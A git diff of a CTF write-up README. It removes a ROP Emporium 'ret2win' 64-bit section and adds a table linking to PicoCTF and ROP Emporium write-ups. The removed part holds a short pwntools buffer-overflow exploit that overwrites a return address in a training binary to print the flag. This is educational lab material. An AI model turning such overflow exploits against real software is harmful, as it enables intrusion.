@@ -1,42 +1,4 @@
-# CTF-2020
-
-> ## [ROP EMPORIUM](#rop)
->
-> - [Ret2Win 64 bit](#ret2win)
-
-
-
-
-
-## ROP EMPORIUM<a name="rop"></a>
-
-***
-
-### RET2WIN64<a name="ret2win"></a>
-
-> For this first challenge I needed to issue the command `$ r2 ret2win`
->
->> This is just an example of nested block quotes 
-
-![First image](https://github.com/jpowellroot/CTF-2020/blob/master/2-1.png?raw=true)
-
-##### payload
-
-~~~ python
-#/usr/bin/env python
-
-from pwn import *
-
-elf = context.binary = ELF('ret2win')    # settin up the environment
-context.log_level = 'debug'
-
-padding = cyclic(40)                     # junk to fill up the buffer
-ret2win = p64(0xdeadbeef)                # address of the ret2win function
-
-payload = padding + ret2win              # final payload
-
-io = process(elf.path)                   
-io.sendline(payload)                     # send the payload
-io.wait_for_close()
-print io.recvall()                       # prints the flag!
-~~~
+| LINK | TYPE | Description | 
+| ---- | ---- | ----------- |  
+| [PICO CTF(2019)](https://github.com/jpowellroot/Pwnfolio/blob/master/Pico_CTF(2019)/readme.md#picoctf19) | CTF | CTF series requiring the use of a varied set of offensive security skills and tools |
+| [ROP Emporium](https://github.com/jpowellroot/Pwnfolio/blob/master/ROP_Emporium/readme.md#ropemp) | CTF | CTF series focusing on the techniques needed to perform Return-Oriented Programming |
